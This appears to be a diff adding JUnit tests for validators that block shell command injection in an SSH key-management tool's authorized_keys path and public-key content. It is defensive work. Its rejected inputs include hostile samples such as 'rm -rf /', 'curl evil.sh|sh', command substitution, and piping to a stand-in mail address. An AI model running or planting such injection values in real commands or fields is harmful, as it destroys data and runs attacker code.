@@ -154,4 +154,60 @@ class SSHUtilTest {
         keyPair.dispose();
         return pubOut.toString();
     }
+
+    // --- isSafeAuthorizedKeysPath / isSafeKeyContent: guards against shell command
+    // injection in addPubKey, where these values are interpolated into "cat"/"echo"/"chmod"
+    // commands sent over the exec channel (see GitHub advisory - authorized_keys path and
+    // public key content are both attacker-reachable, one via the system form, one via a
+    // pasted/uploaded public key comment) ---
+
+    @Test
+    void isSafeAuthorizedKeysPathAcceptsOrdinaryPaths() {
+        assertTrue(SSHUtil.isSafeAuthorizedKeysPath(".ssh/authorized_keys"));
+        assertTrue(SSHUtil.isSafeAuthorizedKeysPath("/home/deploy/.ssh/authorized_keys"));
+        assertTrue(SSHUtil.isSafeAuthorizedKeysPath("some-dir_2/authorized_keys"));
+    }
+
+    @Test
+    void isSafeAuthorizedKeysPathRejectsShellMetacharacters() {
+        assertFalse(SSHUtil.isSafeAuthorizedKeysPath(".ssh/authorized_keys; rm -rf /"));
+        assertFalse(SSHUtil.isSafeAuthorizedKeysPath(".ssh/authorized_keys && curl evil.sh|sh"));
+        assertFalse(SSHUtil.isSafeAuthorizedKeysPath("$(whoami)"));
+        assertFalse(SSHUtil.isSafeAuthorizedKeysPath("`whoami`"));
+        assertFalse(SSHUtil.isSafeAuthorizedKeysPath(".ssh/authorized_keys\nrm -rf /"));
+        assertFalse(SSHUtil.isSafeAuthorizedKeysPath(".ssh/authorized keys"));
+    }
+
+    @Test
+    void isSafeAuthorizedKeysPathRejectsBlank() {
+        assertFalse(SSHUtil.isSafeAuthorizedKeysPath(""));
+        assertFalse(SSHUtil.isSafeAuthorizedKeysPath(null));
+    }
+
+    @Test
+    void isSafeKeyContentAcceptsOrdinaryPublicKeyLines() {
+        assertTrue(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA test@bastillion"));
+    }
+
+    @Test
+    void isSafeKeyContentRejectsKeyWithInjectedSingleQuoteBreakingEchoQuoting() {
+        // breaks out of the single-quoted echo '...' command built in addPubKey
+        assertFalse(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... '; rm -rf / #"));
+    }
+
+    @Test
+    void isSafeKeyContentRejectsOtherShellMetacharacters() {
+        assertFalse(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... $(whoami)"));
+        assertFalse(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... `whoami`"));
+        assertFalse(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... test; rm -rf /"));
+        assertFalse(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... test | mail evil@example.com"));
+        assertFalse(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... test && rm -rf /"));
+        assertFalse(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... test\"quoted\""));
+    }
+
+    @Test
+    void isSafeKeyContentRejectsBlank() {
+        assertFalse(SSHUtil.isSafeKeyContent(""));
+        assertFalse(SSHUtil.isSafeKeyContent(null));
+    }
 }
